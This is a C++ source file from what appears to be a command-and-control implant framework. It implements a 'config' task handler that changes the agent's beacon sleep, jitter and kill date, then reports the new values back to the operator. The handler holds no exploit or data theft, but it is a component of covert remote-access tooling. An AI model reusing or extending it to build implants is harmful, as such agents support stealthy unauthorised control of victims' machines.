#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_CONFIG

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_config(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    // params TLV: sleep_ms(uint32) + jitter(uint32) + killdate(uint32)
    // any field set to 0xFFFFFFFF means "no change"
    uint32_t new_sleep    = parser_int32( params );
    uint32_t new_jitter   = parser_int32( params );
    uint32_t new_killdate = parser_int32( params );

    if ( new_sleep != 0xFFFFFFFF ) {
        inst.agent.sleep_ms = new_sleep;
    }
    if ( new_jitter != 0xFFFFFFFF ) {
        inst.agent.jitter_pct = new_jitter;
    }
    if ( new_killdate != 0xFFFFFFFF ) {
        inst.agent.killdate = new_killdate;
    }

    // build response with current config
    char result[256] = { 0 };
    char tmp[32]     = { 0 };

    str_copy( result, symbol<char*>( const_cast<char*>( "sleep=" ) ) );
    int_to_str( tmp, inst.agent.sleep_ms, 10 );
    str_concat( result, tmp );

    str_concat( result, symbol<char*>( const_cast<char*>( " jitter=" ) ) );
    int_to_str( tmp, inst.agent.jitter_pct, 10 );
    str_concat( result, tmp );

    str_concat( result, symbol<char*>( const_cast<char*>( " killdate=" ) ) );
    int_to_str( tmp, inst.agent.killdate, 10 );
    str_concat( result, tmp );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, result );
}

#endif
